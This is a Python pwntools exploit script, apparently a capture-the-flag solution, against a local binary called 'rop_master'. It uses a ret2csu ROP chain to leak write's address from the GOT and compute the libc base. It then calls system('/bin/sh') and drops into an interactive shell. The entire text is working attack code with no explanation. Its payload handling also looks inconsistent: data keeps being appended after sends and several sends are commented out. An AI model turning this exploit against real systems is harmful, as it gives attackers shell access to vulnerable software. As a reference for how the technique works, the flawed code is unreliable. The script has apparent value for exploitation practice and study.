from pwn import *

p=process("./rop_master")
e=ELF("./rop_master")
libc=e.libc

name_addr = 0x601060
csu1=0x4005f0
csu2=0x400606
write_got = e.got['write']
write_offset = libc.symbols['write']
system_offset = libc.symbols['system']
main_addr = 0x400537
pop_rdi = 0x00400613
leave_ret = 0x004005a2
ret = 0x00400416

payload = b'A'*0x8            #ebp
#payload += p64(ret)           
payload += p64(csu2)            
payload += b'B'*0x8             #add rsp+8
payload += p64(0)               #rbx
payload += p64(1)               #rbp
payload += p64(write_got)       #r12
payload += p64(1)               #r13 -> edi
payload += p64(write_got)       #r14 -> rsi
payload += p64(8)               #r15 -> rdx
payload += p64(csu1)

payload += b'C'*56
payload += p64(main_addr)

p.send(payload)

payload += b'D'*0x100            #buf
payload += p64(name_addr)       #sfp
payload += p64(leave_ret)       #ret

#pause()
#p.send(payload)

p.recvuntil(b"Can you rop it?\n")

write_addr = u64(p.recv(8).strip().ljust(8, b"\x00"))
log.info("write_addr : " + hex(write_addr))
libc_base = write_addr - write_offset
system_addr = libc_base + system_offset
binsh = libc_base + list(libc.search(b"/bin/sh"))[0]

payload += b'E'*0x8              #ebp
#payload += p64(ret)            
payload += p64(csu2)            
payload += b'F'*0x8             #add rsp+8
payload += p64(0)               #rbx
payload += p64(1)               #rbp
payload += p64(system_addr)     #r12
payload += p64(binsh)           #r13 -> edi
payload += b'G'*0x8             #r14 -> rsi
payload += b'H'*0x8             #r15 -> rdx
payload += p64(csu1)

#pause()
#p.send(payload)

payload += b'I'*0x100            #buf
payload += p64(name_addr)       #sfp
payload += p64(leave_ret)       #ret

pause()
p.send(payload)

p.interactive()